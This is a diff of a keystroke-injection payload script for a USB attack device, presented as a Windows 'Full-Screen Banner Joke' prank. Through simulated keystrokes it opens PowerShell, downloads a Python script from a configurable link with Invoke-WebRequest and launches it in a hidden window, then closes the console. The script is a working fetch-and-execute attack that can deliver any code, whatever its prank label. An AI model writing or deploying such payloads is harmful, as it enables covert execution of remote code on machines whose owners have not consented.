@@ -1,34 +1,34 @@
-* ############################################
-* #                                          |
-* # Title        : Full-Screen Banner Joke   |
-* # Author       : Aleff                     |
-* # Version      : 1.0                       |
-* # Category     : Prank                     |
-* # Target       : Windows 10-11             |
-* #                                          |
-* ############################################
+############################################
+#                                          #
+# Title        : Full-Screen Banner Joke   #
+# Author       : Aleff                     #
+# Version      : 1.0                       #
+# Category     : Prank                     #
+# Target       : Windows 10-11             #
+#                                          #
+############################################
 
+ATTACKMODE HID
 
-* Requirements:
-*     - Internet Connection
-*     - Python installed
-*     - ExecutionPolicy Bypass
+# Requirements:
+#  - Internet Connection
+#  - Python installed
+#  - ExecutionPolicy Bypass
 
+# VARIABLES
+# - Set your Python script link
+SCRIPT-PY-LINK='example.com'
 
-QUACK DELAY 1000
+QUACK DELAY 1500
 QUACK GUI r
 QUACK DELAY 500
 QUACK STRING powershell
 QUACK ENTER
 QUACK DELAY 500
-
-* REQUIRED - Set your Python script link
-QUACK STRING Invoke-WebRequest -Uri "SCRIPT-PY-LINK" -OutFile "script.py"
+QUACK STRING Invoke-WebRequest -Uri '$SCRIPT-PY-LINK' -OutFile "script.py"
 QUACK ENTER
 QUACK DELAY 500
-
 QUACK STRING Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
 QUACK ENTER
 QUACK DELAY 1000
 QUACK ALT F4
-Update payload.txt
